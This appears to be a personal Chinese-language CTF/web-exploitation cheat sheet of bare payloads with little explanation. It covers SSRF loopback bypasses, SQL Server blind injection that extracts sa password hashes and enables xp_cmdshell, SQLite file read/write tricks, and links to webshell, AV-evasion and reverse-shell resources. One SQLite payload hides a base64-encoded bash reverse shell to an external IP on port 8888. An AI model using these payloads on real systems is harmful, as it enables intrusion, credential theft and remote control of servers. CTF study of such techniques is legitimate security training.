
# Web

## RCE 命令绕过

包含 www.baidu.com 通过 http://user:pass@host 格式绕过16进制/8进制

`www.baidu.com@127.0.0.2`

绕过 127.0.0.1 , 2-127都可以, 8进制
```txt
127.0.0.2
...
127.0.0.127

curl 127.0.0.0x02
ping 0x7F.0x00.0x00.0x01
ping 0x7F000001
ping 0177.0000.0000.0001
```
### bypass
[Bypass Linux Shell Restrictions](https://mp.weixin.qq.com/s/8QTax87lorWNnOQR8p1ORQ)

## SSRF

1. 不存在路径绕过

`url=/http/../flag`

2. 通过127.0.0.2 ... 127


## curl 使用
curl -i -L
```txt
-i, --include       Incluude protocol response headers in the output
-L, --location      Follow redirects
```


# SQL 注入

## SQL Server
https://www.w3schools.com/sql/sql_ref_sqlserver.asp

```sql
-- db name
Select Name From Master..SysDataBases Where DbId=(Select Dbid From Master..SysProcesses Where Spid = @@spid)
-- stack query
-- if else
SELECT IIF(500<1000, 'YES', 'NO');
if (1=1) waitfor delay '00:00:1' else select 2
-- blind
?id=1' waitfor delay '00:00:2'--'

-- current-user
select CURRENT_USER;
select SYSTEM_USER;
select USER_NAME();

-- functions
ascii,char,charindex,concat,concat with +,concat_ws,datalength,difference,format,left,len,lower,ltrim,nchar,patindex,quotename,replace,replicate,reverse,right,rtrim,soundex,space,str,stuff,substring,translate,trim,unicode,upper
select case when 1=1 then 0 else 2 end  -- if else 
if (1<0) Begin select 'true' End Else Begin select 'false' End -- if else 2

-- sa passwords
select *  FROM master.sys.sql_logins
select *  FROM [master].[sys].[sql_logins]
SELECT name, CAST(CONVERT(varchar(max), password_hash, 1) AS varchar)  FROM master.sys.sql_logins -- 0x0102  https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver16
SELECT name, CAST(CONVERT(varchar(max), password_hash, 2) AS varchar)  FROM master.sys.sql_logins -- 0102

select case when  ascii(SUBSTRING(CAST(CONVERT(varchar(max), password_hash, 2) AS varchar), 1, 1))=48  then 1 else 2 end FROM master.sys.sql_logins -- 判断第二位是否为0
select case when  ascii(SUBSTRING(CAST(CONVERT(varchar(max), password_hash, 2) AS varchar), 2, 1))=49  then 1 else 2 end FROM master.sys.sql_logins -- 判断第二位是否为1


SELECT HOST_NAME()  -- 主机名
SELECT HOST_NAME() AS HostName, SUSER_NAME() LoggedInUser -- SUSER_NAME sa
-- 在master - 视图里
```

启动 xp_cmdshell
```
sp_configure 'show advanced options',1
reconfigure
go
sp_configure 'xp_cmdshell',1
reconfigure
go
```
## Oracle
[干货 | Oracle注入和漏洞利用姿势总结](https://mp.weixin.qq.com/s/cZdS3hgXr8JG2UPrI1S4Cg)

## sqlite

```sql
sqlite3.exe db.sqlite3 -cmd SELECT(name)FROM(sqlite_master)
# 查表名
SELECT name FROM sqlite_master WHERE type='table';
SELECT CHAR(97);  -- 'a'
SELECT HEX('a');  -- 61

-- 2022第五空间 5_Misc_m@sTeR_0f
SELECT writefile('/home/ctf/'||CHAR(46)||'sqliterc',"select readfile('/flag'||CHAR(46)||'txt')")
select sqlite_version()

select readfile('/etc/passwd')
select writefile('/home/ctf/'||(SELECT substr(sqlite_version(),2,1))||'sqliterc',
(SELECT substr(sqlite_version(),2,1)||'shell echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3Lzg4ODggMD4mMQo=|base64 -d|bash'))
```

## Quine 输入=输出
[『CTF』 一次比赛中的 Quine 注入](https://mp.weixin.qq.com/s/zcUgSo825aXINv_IwIvMdg)

# Python

```
{0.__class__.__init__.__globals__}
```
# Javascript

弱类型
```ts
[]  ==  0   // true
[]  ==  ''  // true
[2] ==  2   // true
[0] ==  0   // true
[0] == "0"  // true
[0] ==="0"  // false
"0" !== [0] // true
123+"hello"    // '123hello'
[123]+"hello"  // '123hello'
"123"+"hello"  // '123hello'
```


# Article

[无字母数字RCE初探](http://www.m0x01sery.com/2022/03/28/rce-without-w-and-n/) 
[Web安全-RCE代码及命令执行漏洞](http://mp.weixin.qq.com/s?__biz=MzkzNzQyMDkxMQ==&mid=2247485274&idx=1&sn=590247ec93cd869b37e11f4d4208fd42)

[【安全练兵场】| BurpSuite靶场系列之SQL注入](https://mp.weixin.qq.com/s/RqB-vMifxn0-4hrn0OEoHQ)
[【安全练兵场】| BurpSuite靶场系列之身份验证](https://mp.weixin.qq.com/s/wDWcdTdFRkI8cMK1_pv94w)

[PHP反序列化从0到1](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247496642&idx=1&sn=d1c120b862c75f586492ee9daf011f95)
[详解PHP反序列化字符逃匿](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247495677&idx=1&sn=8b5d7efcb290219f1af7029078d81012)
[详解PHP弱类型安全问题](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247494684&idx=1&sn=8264be9d89d29cc3c2c493b9aaa8d35f)
[Bypass_disable_function总结](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247493192&idx=1&sn=e6ec9ea78e2faccc013787376aced1cc)
[bypass_无参数读文件和RCE的利用](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247492577&idx=1&sn=3011d1eebe62226644ad83e9f6fee67a)
[Android-Webview中的漏洞利用总结](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247493433&idx=1&sn=c7f12e2b2afa2b57a9c663d272c40511)
[SQLite注入](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247492558&idx=1&sn=9f77c3df6508345194b6646f31cc4b29)
[Java | JDBC 反序列化漏洞分析 & POC 编写](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247491462&idx=1&sn=8846b0f6a7ec694ff14722a78bc079d0)
[Java | JDK8从任意文件写到远程命令执行](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247493744&idx=1&sn=e3661151be5be5d88d41b8c88326841c)
## PHP
[PHP原生类在安全方面的利用总结 | echo new a(b) | Error/Exception内置类绕过哈希比较 | SoapClient类进行SSRF | SimpleXMLElement类进行XXE](https://mp.weixin.qq.com/s/CDNU1RgfeliURN69UZqCTA)

## rce
[无字母数字Webshell&&冰蝎Webshell](https://mp.weixin.qq.com/s/1PX7_nU7bmqOs3lGb8O8gw)

## SRC
[Java代码分析工具Tabby在CTF中的运用](https://mp.weixin.qq.com/s/u7RuSmBHy76R7_PqL8WJww)
[挖洞思路：前端源码泄露漏洞并用source map文件还原](https://blog.csdn.net/qq_44930903/article/details/124257571)
## 工具/马
[java 内存马](https://github.com/su18/ysoserial)
[Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
[史上最全一句话木马](https://mp.weixin.qq.com/s/o_HUnlubJdPRdQdpnMJeEw)
[ChatGPT 写了“木马”](https://mp.weixin.qq.com/s/C3taCJVQP0RwNSBXoBnJFg)

## 免杀
[免杀学习——PHP免杀](https://blog.csdn.net/ZxC789456302/article/details/127473366): 白白白无-免杀学习——PHP免杀----🔥 热度:9113 
[jsp](https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/Runtime-reflect-cmd.jsp)

## SQLi
[2022 年最佳 SQL 注入检测工具【文末抽书】](https://mp.weixin.qq.com/s/2clT1zX9s8RXpMPsRK5zyg)
[nosql注入用户名密码爆破工具](https://0xmrm.com/272.html)
## ssti 
https://blog.csdn.net/miuzzx/article/details/127744431#t4
[CTF中SSTI漏洞的简单利用](https://mp.weixin.qq.com/s/pA-ca-b0IYszwjmkCIdYBg)

## AWD
[Web AWD竞赛的攻击与防御技巧](http://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247493468&idx=1&sn=507cbbb3809c19ad4d16475904bf8001)
